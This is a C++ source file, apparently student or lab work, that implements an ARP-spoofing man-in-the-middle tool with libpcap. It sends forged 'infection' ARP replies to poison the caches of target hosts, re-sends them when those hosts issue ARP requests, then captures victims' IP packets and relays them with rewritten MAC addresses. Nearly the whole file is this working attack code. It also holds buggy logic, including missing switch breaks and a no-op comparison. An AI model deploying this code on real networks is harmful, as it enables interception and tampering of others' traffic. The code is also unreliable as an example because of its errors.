#include <iostream>
#include "libnet-headers.h"
#include "packet_info.h"
#include <cstdio>
#include <pcap.h>
#include "packet_info.h"
#include "generate_packet.h"
#include <stdint.h>
#include <cstring>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <cstring>
#include <arpa/inet.h>
#include <net/if.h>
#include <vector>

#define NONE_PACK           -1
#define ETH_TYPE_ARP_CHK    0
#define ETH_TYPE_IP_CHK     1

void packet_filter(pcap_t *pack_d,packet_info *pack_info,generate_packet *infection_class);
int eth_type_check(uint8_t * packet_data,uint16_t *type_chk_list,int list_size);
int arp_req_check(uint8_t * packet_data, packet_info *pack_info);
int ip_pack_check(uint8_t * packet_data, packet_info *pack_info);
void ip_pack_convert(uint8_t * packet_data, packet_info *pack_info,int num);

using namespace std;

int main(int argc, char *argv[])
{

    printf("hello1");
    packet_info pack_info;

    pack_info.allocate_param(argc,argv[1]);
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t * pd = pcap_open_live(pack_info.get_my_dev(),BUFSIZ,1,1,errbuf);//1sec

    printf("\nhello2");
    pack_info.set_my_info();
    printf("\nhello3\n");
    printf("ip: %s %s\n",argv[2],argv[3]);
    printf("ip_address %x  %x\n",&argv[2],&argv[3]);
    pack_info.set_param_ip(&argv[2]);
    pack_info.set_param_mac(pd);

    printf("1111\n\n");
    generate_packet recovery_packet(pack_info.get_param_count());
    recovery_packet.arp_reply_set(pack_info);

    recovery_packet.send_arp_reply(pd,0);
    packet_filter(pd,&pack_info,&recovery_packet);

    return 0;
}

void packet_filter(pcap_t *pack_d,packet_info *pack_info,generate_packet *infection_class)
{
    std ::vector<uint16_t>packet_type;

    packet_type.push_back(htons(ETHERTYPE_ARP));
    packet_type.push_back(htons(ETHERTYPE_IP));


    printf("!1111111111111111111\n\n");
    int loopstatus;
    const uint8_t *pkt_data;
    struct pcap_pkthdr *pkt_hdr;
    int pack_type_result = 0;
    //int pack_type_chk(,&packet_type);
    while((loopstatus = pcap_next_ex(pack_d, &pkt_hdr, &pkt_data)) >= 0) {//pkt_data 's adress

        //(void)pkt_hdr;//useless
        printf("\n\nfilter start \n\n");
        if(loopstatus == 0)
            continue;
        pack_type_result = eth_type_check((uint8_t *)pkt_data,(uint16_t *)&packet_type[0],packet_type.size());

        switch(pack_type_result){

            case(ETH_TYPE_ARP_CHK):{
                int relay_pack_num = arp_req_check((uint8_t *)pkt_data,pack_info);

                if(relay_pack_num== -1)
                    continue;

                printf("send infection_packet\n");
                infection_class->send_arp_reply(pack_d,relay_pack_num);
            }
            case(ETH_TYPE_IP_CHK):{
            printf("ip_check_jumpinto\n");
                int ip_relay_flag =ip_pack_check((uint8_t *)pkt_data,pack_info);

                if(ip_relay_flag == NONE_PACK)//packet_data,ip,info_struc
                    continue;//return -1

                printf("ip_packet_convert_start\n\n\n\n");
                ip_pack_convert((uint8_t *)pkt_data,pack_info,ip_relay_flag);

                if(pcap_sendpacket(pack_d,pkt_data,pkt_hdr->len) !=0)
                    pcap_perror(pack_d,"packet send error\n\n");
                printf("\nsend ok!!\n");


            }
            default:{}
        }

        printf("end1;");
        printf("\nhere2?");
        printf("\nGet MacAddress Done.\n");



    }
    if(loopstatus == -1 || loopstatus == -2)
        pcap_perror(pack_d,"Packet data read error");



}
int eth_type_check(uint8_t *packet_data,uint16_t *type_chk_list,int list_size)
{
    struct libnet_ethernet_hdr * recv_packet=(struct libnet_ethernet_hdr *)packet_data;
    int type_check_result = NONE_PACK;
    //printf("list_size is= %d \n",list_size);
    //printf("type : %4x\n\n",type_chk_list[1]);
   /* uint8_t* temp_arr = (uint8_t*) recv_packet;
    for(int i=0;i<20;i++){
        printf(" %02x ",temp_arr[i]);
    }*/
    for(int i=0;i<list_size;i++)
        if(memcmp(&recv_packet->ether_type,&type_chk_list[i],sizeof(uint16_t)) == 0 ){
            type_check_result = i;
            printf("this pack type is %d\n\n",i);
            return type_check_result;
        }else{
            continue;
        }
    return type_check_result;
}

//int arp_req_check
int arp_req_check(uint8_t * packet_data, packet_info *pack_info){
    //int count = pack_info->get_param_count();
    struct libnet_ethernet_hdr * recv_arp_req =(struct libnet_ethernet_hdr *)packet_data;
    //eth
    struct arp_header_ip *recv_arp_hdr =(struct arp_header_ip *)&packet_data[LIBNET_ETH_H+LIBNET_ARP_H];
    //arp
    int cmp_result =0;
    printf("arp_req_check_area\n");
    for(int i=0;i<pack_info->get_param_count();i++){

        cmp_result ==(memcmp(&recv_arp_hdr->dst_ip,(uint32_t *)pack_info->target_ip_ref(i),sizeof(uint32_t)));
        if(0==( cmp_result && memcmp(&recv_arp_hdr->src_ip,(uint32_t *)pack_info->sender_ip_ref(i),sizeof(uint32_t))) ) {\
            return i;
        }else{
            continue;
        }
    }
    return NONE_PACK;
}


int ip_pack_check(uint8_t * packet_data, packet_info *pack_info){
    struct libnet_ethernet_hdr *recv_ip_pack = (struct libnet_ethernet_hdr *)packet_data;
    struct libnet_ipv4_hdr *recv_arp_hdr =(struct libnet_ipv4_hdr *)&packet_data[LIBNET_ETH_H];

    int mac_check=0;
    //dstmac == me
    printf("type check :%2x \n",recv_arp_hdr->ip_p);
    if(memcmp(&recv_ip_pack->ether_dhost[0],(uint8_t *)pack_info->my_mac_ref(),ETHER_ADDR_LEN) != 0){
        printf("not number1 \n");
        return NONE_PACK;
    }
    printf("still alive1");
    //sendermac == 25

    /*          */

    printf("\ns_ip :%x \n",recv_arp_hdr->ip_src.s_addr);
    printf("d_ip : %x\n",recv_arp_hdr->ip_dst.s_addr);
    for(int i=0;i<pack_info->get_param_count();i++){
        if(memcmp(recv_ip_pack->ether_shost,(uint8_t *)pack_info->sender_mac_ref(i),ETHER_ADDR_LEN) == 0){

            printf("check_shost :\n");
                        for(int j=0;j<6;j++){
                            printf("%02x ",recv_ip_pack->ether_shost[j]);

                        }


                        printf("\n");
                        printf("check_sender_mac :\n");
                        uint8_t *nice =(uint8_t *)pack_info->sender_mac_ref(i);
                        for(int j=0;j<6;j++){

                            printf("%02x ",nice[j]);

                        }
                        printf("\n");
            mac_check =i;
            break;
        }
        else{
            mac_check = NONE_PACK;
        }

    }
    printf("mac)check %d\n",mac_check);
    if(mac_check == NONE_PACK){
        printf("not number2 \n");
        return NONE_PACK;
    }

    int cmp_result1 = memcmp(&recv_arp_hdr->ip_src.s_addr,(uint32_t *)pack_info->my_ip_ref(),sizeof(uint32_t));
    int cmp_result2 = memcmp(&recv_arp_hdr->ip_dst.s_addr,(uint32_t *)pack_info->my_ip_ref(),sizeof(uint32_t));
    if(0 !=(cmp_result1&&cmp_result2)){
       // printf("rigthy pakcet captured!\n");
        return mac_check;
    }

     printf("not number3 \n");
    return NONE_PACK;
    //sender of dst is senderlist same


    //broad_check = memcmp(&recv_ip_pack->ether_dhost,(uint8_t *)pack_info->broad_ff_ref(),ETHER_ADDR_LEN);

    //broad_check = memcmp(&recv_ip_pack->ether_dhost[0],(uint8_t *)pack_info->my_mac_ref(),ETHER_ADDR_LEN);
    //printf("\nbroad %d\n",broad_check);
    //if(broad_check == 0){

      //  int cmp_result =0;


        //uint8_t *tmp_recv_ip_pack = (uint8_t *)recv_arp_hdr;
        /*printf("\n\nmoho data: \n");
        for(int i=0;i<40;i++){
            printf("%02x ",tmp_recv_ip_pack[i]);
        }
        printf("\n");*/

}
void ip_pack_convert(uint8_t * packet_data, packet_info *pack_info,int num)
{
    struct libnet_ethernet_hdr *recv_ip_pack=(struct libnet_ethernet_hdr *)packet_data;
    memcpy(recv_ip_pack->ether_dhost,(uint8_t *)pack_info->target_mac_ref(num),ETHER_ADDR_LEN);
    memcpy(recv_ip_pack->ether_shost,(uint8_t *)pack_info->my_mac_ref(),ETHER_ADDR_LEN);
    printf("changed!\n");
    return;

}
